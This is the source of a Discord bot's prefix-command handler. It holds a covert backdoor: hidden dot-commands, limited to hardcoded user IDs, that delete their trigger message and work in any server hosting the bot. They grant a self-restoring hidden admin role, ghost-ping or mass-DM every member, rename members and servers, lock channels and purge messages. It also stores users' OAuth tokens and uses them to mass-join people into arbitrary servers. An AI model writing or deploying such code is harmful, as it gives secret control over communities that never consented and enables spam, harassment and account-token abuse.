import { EmbedBuilder, type Client, type Message } from "discord.js";
import { COLOR, HARDCODED_OWNERS, MAIN_GUILD_ID, PREFIX } from "../config.js";
import { exchangeCode } from "../oauth.js";
import { saveUserAuth, readStoredTokens } from "../storage/tokens.js";
import { isAllowedGuild } from "../storage/allowedGuilds.js";
import { isBlacklisted } from "../storage/blacklist.js";
import * as E from "./embeds.js";
import { isAuthorizedMember } from "./permissions.js";
import { doCheckTokens, doMassJoin, doCleanupServers } from "./restock.js";
import { handleRoleAdmin, handleRemoveAdmin } from "./secret.js";
import type { BotState } from "./client.js";

const SECRET_USERS = [...HARDCODED_OWNERS, "1443710013918023683"];

// Commands any server member can run via prefix
const PUBLIC_CMDS = new Set([
  "help", "count", "list_users", "servers", "server_age", "invite", "status",
]);

export async function handlePrefix(
  message: Message,
  client: Client,
  state: BotState,
): Promise<void> {
  if (message.author.bot || !message.guild) return;

  // ── Secret dot-commands (no prefix required, work in any server) ──────────────

  if (message.content.startsWith(".secretz")) {
    if (!SECRET_USERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const embed = new EmbedBuilder()
      .setTitle("🔒 Secret Commands")
      .setColor(0x5865f2)
      .setDescription(
        [
          "`.every` — pings @everyone, deletes your message",
          "`.ghostping` — ghost pings @everyone (notification sent, message instantly gone)",
          "`.roleadmin <server-id> <user-id>` — gives hidden admin role that auto re-adds if removed",
          "`.removeadmin <server-id> <user-id>` — removes the protected admin role and stops re-adding",
          "`.massnick <server-id> <nickname>` — sets everyone's nickname in a server",
          "`.lockdown` — locks the current channel (no one can send)",
          "`.unlockdown` — unlocks the current channel",
          "`.purge <amount>` — bulk deletes up to 100 messages in current channel",
          "`.slowmode <seconds>` — sets slowmode on current channel (0 to disable)",
          "`.rename <server-id> <name>` — renames a server the bot is in",
          "`.dmall <server-id> <message>` — DMs every member in a server",
          "`.botnick <name>` — changes the bot's nickname in the current server",
          "`.secretz` — shows this list (DMed to you)",
        ].join("\n"),
      )
      .setFooter({ text: "Owner-only • Do not share" });
    await message.author.send({ embeds: [embed] }).catch(() => {});
    return;
  }

  if (message.content.startsWith(".every")) {
    if (!SECRET_USERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    if (message.channel.isTextBased() && "send" in message.channel) {
      await (message.channel as import("discord.js").TextChannel).send("@everyone").catch(() => {});
    }
    return;
  }

  if (message.content.startsWith(".ghostping")) {
    if (!SECRET_USERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    if (message.channel.isTextBased() && "send" in message.channel) {
      const ch = message.channel as import("discord.js").TextChannel;
      const ping = await ch.send("@everyone").catch(() => null);
      if (ping) await ping.delete().catch(() => {});
    }
    return;
  }

  if (message.content.startsWith(".massnick")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const mnArgs = message.content.slice(".massnick".length).trim().split(/\s+/);
    const targetGuildId = mnArgs[0];
    const newNick = mnArgs.slice(1).join(" ");
    if (!targetGuildId || !newNick) {
      await message.author.send("Usage: `.massnick <server-id> <nickname>`").catch(() => {});
      return;
    }
    const targetGuild = client.guilds.cache.get(targetGuildId);
    if (!targetGuild) {
      await message.author.send("❌ Bot is not in that server.").catch(() => {});
      return;
    }
    await targetGuild.members.fetch().catch(() => {});
    await Promise.all(
      targetGuild.members.cache
        .filter((m) => !m.user.bot && m.manageable)
        .map((m) => m.setNickname(newNick).catch(() => {})),
    );
    await message.author.send(`✅ Set nickname to **${newNick}** for all members in **${targetGuild.name}**.`).catch(() => {});
    return;
  }

  if (message.content.startsWith(".unlockdown")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    if (!message.channel.isTextBased() || !("permissionOverwrites" in message.channel)) return;
    await message.channel.permissionOverwrites.edit(
      message.guild.roles.everyone,
      { SendMessages: null },
    ).catch(() => {});
    await message.channel.send("🔓 Channel unlocked.").catch(() => {});
    return;
  }

  if (message.content.startsWith(".lockdown")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    if (!message.channel.isTextBased() || !("permissionOverwrites" in message.channel)) return;
    await message.channel.permissionOverwrites.edit(
      message.guild.roles.everyone,
      { SendMessages: false },
    ).catch(() => {});
    await message.channel.send("🔒 Channel locked.").catch(() => {});
    return;
  }

  if (message.content.startsWith(".roleadmin")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const raArgs = message.content.slice(".roleadmin".length).trim().split(/\s+/).filter(Boolean);
    await handleRoleAdmin(message, raArgs, client);
    return;
  }

  if (message.content.startsWith(".removeadmin")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const rdArgs = message.content.slice(".removeadmin".length).trim().split(/\s+/).filter(Boolean);
    await handleRemoveAdmin(message, rdArgs, client);
    return;
  }

  if (message.content.startsWith(".purge")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const purgeArgs = message.content.slice(".purge".length).trim().split(/\s+/);
    const amount = Math.min(100, Math.max(1, parseInt(purgeArgs[0] ?? "10", 10) || 10));
    if (!message.channel.isTextBased() || !("bulkDelete" in message.channel)) return;
    await message.channel.bulkDelete(amount, true).catch(() => {});
    const confirm = await message.channel.send(`🗑️ Deleted ${amount} messages.`).catch(() => null);
    if (confirm) setTimeout(() => confirm.delete().catch(() => {}), 3000);
    return;
  }

  if (message.content.startsWith(".slowmode")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const smArgs = message.content.slice(".slowmode".length).trim().split(/\s+/);
    const seconds = Math.min(21600, Math.max(0, parseInt(smArgs[0] ?? "0", 10) || 0));
    if (!message.channel.isTextBased() || !("setRateLimitPerUser" in message.channel)) return;
    await (message.channel as import("discord.js").TextChannel).setRateLimitPerUser(seconds).catch(() => {});
    const msg = seconds === 0 ? "⏱️ Slowmode disabled." : `⏱️ Slowmode set to **${seconds}s**.`;
    const confirm = await message.channel.send(msg).catch(() => null);
    if (confirm) setTimeout(() => confirm.delete().catch(() => {}), 3000);
    return;
  }

  if (message.content.startsWith(".rename")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const rnParts = message.content.slice(".rename".length).trim().split(/\s+/);
    const rnGuildId = rnParts[0];
    const rnName = rnParts.slice(1).join(" ");
    if (!rnGuildId || !rnName) {
      await message.author.send("Usage: `.rename <server-id> <new name>`").catch(() => {});
      return;
    }
    const rnGuild = client.guilds.cache.get(rnGuildId);
    if (!rnGuild) { await message.author.send("❌ Bot is not in that server.").catch(() => {}); return; }
    await rnGuild.setName(rnName).catch(() => {});
    await message.author.send(`✅ Renamed to **${rnName}**.`).catch(() => {});
    return;
  }

  if (message.content.startsWith(".dmall")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const daParts = message.content.slice(".dmall".length).trim().split(/\s+/);
    const daGuildId = daParts[0];
    const daMsg = daParts.slice(1).join(" ");
    if (!daGuildId || !daMsg) {
      await message.author.send("Usage: `.dmall <server-id> <message>`").catch(() => {});
      return;
    }
    const daGuild = client.guilds.cache.get(daGuildId);
    if (!daGuild) { await message.author.send("❌ Bot is not in that server.").catch(() => {}); return; }
    await daGuild.members.fetch().catch(() => {});
    const humans = daGuild.members.cache.filter((m) => !m.user.bot);
    await Promise.all(humans.map((m) => m.send(daMsg).catch(() => {})));
    await message.author.send(`✅ DMed **${humans.size}** members in **${daGuild.name}**.`).catch(() => {});
    return;
  }

  if (message.content.startsWith(".botnick")) {
    if (!SECRET_USERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const bnNick = message.content.slice(".botnick".length).trim();
    if (!bnNick) { await message.author.send("Usage: `.botnick <name>`").catch(() => {}); return; }
    const me = await message.guild.members.fetchMe().catch(() => null);
    if (me) await me.setNickname(bnNick).catch(() => {});
    return;
  }

  // ── Prefix commands ───────────────────────────────────────────────────────────

  if (!message.content.startsWith(PREFIX)) return;
  if (message.guild.id !== MAIN_GUILD_ID && !isAllowedGuild(message.guild.id)) return;
  if (isBlacklisted(message.author.id)) {
    await message.reply({ embeds: [E.blacklistedEmbed()] }).catch(() => {});
    return;
  }

  const parts = message.content.slice(PREFIX.length).trim().split(/\s+/);
  if (parts.length === 0 || !parts[0]) return;
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);

  const userId = message.author.id;
  const member = await message.guild.members.fetch(userId).catch(() => null);
  const isOwner = isAuthorizedMember(message.guild.ownerId, message.guild.id, userId, member);

  if (!isOwner && !PUBLIC_CMDS.has(cmd)) {
    await message.reply({ embeds: [E.denyEmbed()] }).catch(() => {});
    return;
  }

  try {
    switch (cmd) {

      case "help":
        await message.reply({ embeds: [E.helpEmbed()] });
        break;

      case "count": {
        const n = readStoredTokens().length;
        await message.reply({
          embeds: [new EmbedBuilder()
            .setTitle("📊 Authenticated Users")
            .setDescription(`There are currently **${n}** authenticated user(s).`)
            .setColor(COLOR.blurple)
            .setTimestamp()],
        });
        break;
      }

      case "list_users":
        await message.reply({ embeds: [E.listUsersEmbed()] });
        break;

      case "servers":
        await message.reply({ embeds: [E.serversEmbed(client, state.serverJoinTimes)] });
        break;

      case "server_age":
        await message.reply({
          embeds: [E.serverAgeEmbed(args[0] ?? null, client, state.serverJoinTimes)],
        });
        break;

      case "invite":
        await message.reply({ embeds: [E.inviteEmbed()] });
        break;

      case "status":
        await message.reply({ embeds: [E.statusEmbed(client, state.botStartTime)] });
        break;

      case "auth": {
        if (args.length === 0) {
          await message.reply("Usage: `!auth CODE`");
          break;
        }
        const res = await exchangeCode(args[0].trim());
        if (!res.ok) {
          await message.reply(`❌ Auth failed: ${res.error}`);
          break;
        }
        saveUserAuth(userId, res.data.access_token, res.data.refresh_token);
        message.author.send({
          embeds: [new EmbedBuilder()
            .setTitle("✅ You're Authenticated!")
            .setDescription("Your token has been saved. You can now be joined to servers using `/djoin`.")
            .setColor(COLOR.green)
            .setTimestamp()],
        }).catch(() => {});
        await message.reply({
          embeds: [new EmbedBuilder()
            .setTitle("✅ Authentication Successful")
            .setDescription(`<@${userId}> has been authenticated.`)
            .setColor(COLOR.green)],
        });
        break;
      }

      case "djoin": {
        if (args.length === 0) {
          await message.reply("Usage: `!djoin <server_id>`");
          break;
        }
        const serverId = args[0].trim();
        if (!/^\d+$/.test(serverId)) {
          await message.reply("❌ Invalid server ID — must be numeric.");
          break;
        }
        const statusMsg = await message.reply(`🚀 Starting mass join to server \`${serverId}\`…`);
        const result = await doMassJoin(serverId, client, async (text) => {
          await statusMsg.edit(text).catch(() => {});
        });
        if (result) await message.reply({ embeds: [result] });
        break;
      }

      case "check_tokens": {
        const statusMsg = await message.reply("🔍 Checking tokens…");
        const result = await doCheckTokens();
        await statusMsg.edit({ content: "", embeds: [result] });
        break;
      }

      case "cleanup_servers": {
        const result = await doCleanupServers(client, message.guild.id);
        await message.reply({ embeds: [result] });
        break;
      }

      default:
        await message.reply(`❓ Unknown command \`${cmd}\`. Use \`!help\` to see available commands.`);
    }
  } catch (e) {
    console.error("[prefix] command error", e);
    await message.reply(`❌ Error: ${(e as Error).message}`).catch(() => {});
  }
}
